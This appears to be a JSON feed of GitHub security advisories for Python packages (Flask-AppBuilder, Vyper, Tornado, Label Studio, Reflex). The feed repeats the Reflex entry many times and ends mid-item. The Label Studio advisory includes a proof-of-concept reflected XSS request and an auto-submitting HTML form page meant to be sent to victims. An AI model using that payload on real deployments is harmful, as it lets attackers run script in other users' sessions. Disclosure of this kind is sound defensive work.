{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Flask-AppBuilder prior to 4.6.2 would allow for a malicious unauthenticated actor to perform an open redirect by manipulating the Host header in HTTP requests.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Flask-AppBuilder 4.6.2 introduced the <code>FAB_SAFE_REDIRECT_HOSTS</code> configuration variable, which allows administrators to explicitly define which domains are considered safe for redirection.</p>\n<p>Examples:</p>\n<pre><code>FAB_SAFE_REDIRECT_HOSTS = [\"yourdomain.com\", \"sub.yourdomain.com\", \"*.yourcompany.com\"]\n</code></pre>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use a Reverse Proxy to Enforce Trusted Host Headers</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-99pm-ch96-ccp2\">https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-99pm-ch96-ccp2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32962\">https://nvd.nist.gov/vuln/detail/CVE-2025-32962</a></li>\n<li><a href=\"https://github.com/dpgaspar/Flask-AppBuilder/commit/32eedbbb5cb483a3e782c5f2732de4a6a650d9b6\">https://github.com/dpgaspar/Flask-AppBuilder/commit/32eedbbb5cb483a3e782c5f2732de4a6a650d9b6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99pm-ch96-ccp2\">https://github.com/advisories/GHSA-99pm-ch96-ccp2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99pm-ch96-ccp2",
            "title": "[flask-appbuilder] Flask-AppBuilder open redirect vulnerability using HTTP host injection",
            "date_modified": "2025-05-16T17:28:26.000Z",
            "date_published": "2025-05-16T17:28:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99pm-ch96-ccp2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>the <code>slice()</code> builtin can elide side effects when the output length is 0, and the source bytestring is a builtin (<code>msg.data</code> or <code>&lt;address&gt;.code</code>). the reason is that for these source locations, the check that <code>length &gt;= 1</code> is skipped:\n<a href=\"https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L315-L319\">https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L315-L319</a></p>\n<p>the result is that a 0-length bytestring constructed with slice can be passed to <code>make_byte_array_copier</code>, which elides evaluation of its source argument when the max length is 0:\n<a href=\"https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/codegen/core.py#L189-L191\">https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/codegen/core.py#L189-L191</a></p>\n<p>the impact is that side effects in the <code>start</code> argument may be elided when the <code>length</code> argument is 0, e.g. <code>slice(msg.data, self.do_side_effect(), 0)</code>.</p>\n<p>the following example illustrates how the issue would look in user code</p>\n<pre><code class=\"language-vyper\">counter: public(uint256)\n\n@external\ndef test() -&gt; Bytes[10]:\n    b: Bytes[10] = slice(msg.data, self.side_effect(), 0)\n    return b\n\ndef side_effect() -&gt; uint256:\n    self.counter += 1\n    return 0\n</code></pre>\n<p>the severity assigned is low, since this is not a very useful pattern and unlikely to be found in user code.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>the fix is tracked in <a href=\"https://github.com/vyperlang/vyper/pull/4645\">https://github.com/vyperlang/vyper/pull/4645</a>, which disallows any invocation of <code>slice()</code> with length 0, including for the ad hoc locations discussed in this advisory.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-3vcg-j39x-cwfm\">https://github.com/vyperlang/vyper/security/advisories/GHSA-3vcg-j39x-cwfm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47774\">https://nvd.nist.gov/vuln/detail/CVE-2025-47774</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4645\">https://github.com/vyperlang/vyper/pull/4645</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L315-L319\">https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L315-L319</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/codegen/core.py#L189-L191\">https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/codegen/core.py#L189-L191</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3vcg-j39x-cwfm\">https://github.com/advisories/GHSA-3vcg-j39x-cwfm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3vcg-j39x-cwfm",
            "title": "[vyper] Vyper's `slice()` may elide side-effects when output length is 0",
            "date_modified": "2025-05-16T14:13:32.000Z",
            "date_published": "2025-05-16T14:13:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3vcg-j39x-cwfm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When Tornado's <code>multipart/form-data</code> parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<p>All versions of Tornado prior to 6.5.0 are affected. The vulnerable parser is enabled by default.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking <code>Content-Type: multipart/form-data</code> in a proxy.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m\">https://github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47287\">https://nvd.nist.gov/vuln/detail/CVE-2025-47287</a></li>\n<li><a href=\"https://github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3\">https://github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cx3-6m66-7c5m\">https://github.com/advisories/GHSA-7cx3-6m66-7c5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cx3-6m66-7c5m",
            "title": "[tornado] Tornado vulnerable to excessive logging caused by malformed multipart form data",
            "date_modified": "2025-05-16T14:12:41.000Z",
            "date_published": "2025-05-16T14:12:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cx3-6m66-7c5m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><code>concat()</code> may skip evaluation of side effects when the length of an argument is zero. this is due to a fastpath in the implementation which skips evaluation of argument expressions when their length is zero:\n<a href=\"https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L560-L562\">https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L560-L562</a></p>\n<p>in practice, it would be very unusual in user code to construct zero-length bytestrings using an expression with side-effects, since zero-length bytestrings are typically constructed with the empty literal <code>b\"\"</code>; the only way to construct an empty bytestring which has side effects would be with the ternary operator introduced in v0.3.8, e.g. <code>b\"\" if self.do_some_side_effect() else b\"\"</code>.</p>\n<p>the following example demonstrates how the issue would look in user code</p>\n<pre><code class=\"language-vyper\">counter: public(uint256)\n\n@external\ndef test() -&gt; Bytes[256]:\n    a: Bytes[256] = concat(b\"\" if self.sideeffect() else b\"\", b\"aaaa\")\n    return a\n\ndef sideeffect() -&gt; bool:\n    self.counter += 1\n    return True\n</code></pre>\n<p>the severity assigned is low, since, as mentioned, this would be a very unusual pattern in user-code.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>fix is tracked in <a href=\"https://github.com/vyperlang/vyper/pull/4644\">https://github.com/vyperlang/vyper/pull/4644</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>don't have side effects in expressions which construct zero-length bytestrings.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-qhr6-mgqr-mchm\">https://github.com/vyperlang/vyper/security/advisories/GHSA-qhr6-mgqr-mchm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47285\">https://nvd.nist.gov/vuln/detail/CVE-2025-47285</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4644\">https://github.com/vyperlang/vyper/pull/4644</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L560-L562\">https://github.com/vyperlang/vyper/blob/68b68c4b30c5ef2f312b4674676170b8a6eaa316/vyper/builtins/functions.py#L560-L562</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qhr6-mgqr-mchm\">https://github.com/advisories/GHSA-qhr6-mgqr-mchm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qhr6-mgqr-mchm",
            "title": "[vyper] Vyper's `concat()` builtin may elide side-effects for zero-length arguments",
            "date_modified": "2025-05-16T14:10:26.000Z",
            "date_published": "2025-05-16T14:10:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qhr6-mgqr-mchm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The vulnerability allows an attacker to inject a malicious script into the context of a web page, which can lead to data theft, unauthorized actions on behalf of the user, and other attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability is reproducible when sending a properly formatted request to the <code>POST /projects/upload-example/</code> endpoint. In the source code, the vulnerability is located at <code>label_studio/projects/views.py</code>.</p>\n<pre><code class=\"language-python\">39: @require_http_methods(['POST'])\n40: def upload_example_using_config(request):\n41:     \"\"\"Generate upload data example by config only\"\"\"\n42:     config = request.POST.get('label_config', '')\n43: \n44:     org_pk = get_organization_from_request(request)\n45:     secure_mode = False\n46:     if org_pk is not None:\n47:         org = generics.get_object_or_404(Organization, pk=org_pk)\n48:         secure_mode = org.secure_mode\n49: \n50:     try:\n51:         Project.validate_label_config(config)\n52:         task_data, _, _ = get_sample_task(config, secure_mode)\n53:         task_data = playground_replacements(request, task_data)\n54:     except (ValueError, ValidationError, lxml.etree.Error):\n55:         response = HttpResponse('error while example generating', status=status.HTTP_400_BAD_REQUEST)\n56:     else:\n57:         response = HttpResponse(json.dumps(task_data))\n58:     return response\n</code></pre>\n<p>The vulnerability is specifically located in line 57, where HttpResponse is used.</p>\n<pre><code class=\"language-python\">57:         response = HttpResponse(json.dumps(task_data))\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Send the following request after changing the <code>{host}</code> to your own.</p>\n<pre><code class=\"language-css\">POST /projects/upload-example/ HTTP/1.1\nHost: {host}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 67\n\nlabel_config=%3cView%3e%3cText%20name%3d%22text%22%20value%3d%22$textjmwwi%26lt%3bscript%26gt%3balert(1)%26lt%3b%2fscript%26gt%3bs8m37%22%2f%3e%3c%2fView%3e\n</code></pre>\n<p>Or you can create a vulnerable HTML page by changing <code>{domain}</code> beforehand, which can later be sent to the victim.</p>\n<pre><code class=\"language-html\">&lt;html&gt;\n  &lt;body&gt;\n    &lt;form action=\"http://{domain}/projects/upload-example/\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"label&amp;#95;config\" value=\"&amp;lt;View&amp;gt;&amp;lt;Text&amp;#32;name&amp;#61;&amp;quot;text&amp;quot;&amp;#32;value&amp;#61;&amp;quot;&amp;#36;textjmwwi&amp;amp;lt&amp;#59;script&amp;amp;gt&amp;#59;alert&amp;#40;1&amp;#41;&amp;amp;lt&amp;#59;&amp;#47;script&amp;amp;gt&amp;#59;s8m37&amp;quot;&amp;#47;&amp;gt;&amp;lt;&amp;#47;View&amp;gt;\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>Malicious code execution: The user may be forced to perform unwanted actions within their Label Studio account. This includes accessing <code>document.cookie</code>, but note that Label Studio session cookies are marked http-only, mitigating any possibility of session theft.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-8jhr-wpcm-hh4h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47783\">https://nvd.nist.gov/vuln/detail/CVE-2025-47783</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/97db9e7b16783e1f6052eb432a6f014f80ef268d\">https://github.com/HumanSignal/label-studio/commit/97db9e7b16783e1f6052eb432a6f014f80ef268d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8jhr-wpcm-hh4h\">https://github.com/advisories/GHSA-8jhr-wpcm-hh4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8jhr-wpcm-hh4h",
            "title": "[label-studio] label-studio vulnerable to Cross-Site Scripting (Reflected) via the label_config parameter.",
            "date_modified": "2025-05-15T16:21:17.000Z",
            "date_published": "2025-05-15T16:21:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8jhr-wpcm-hh4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
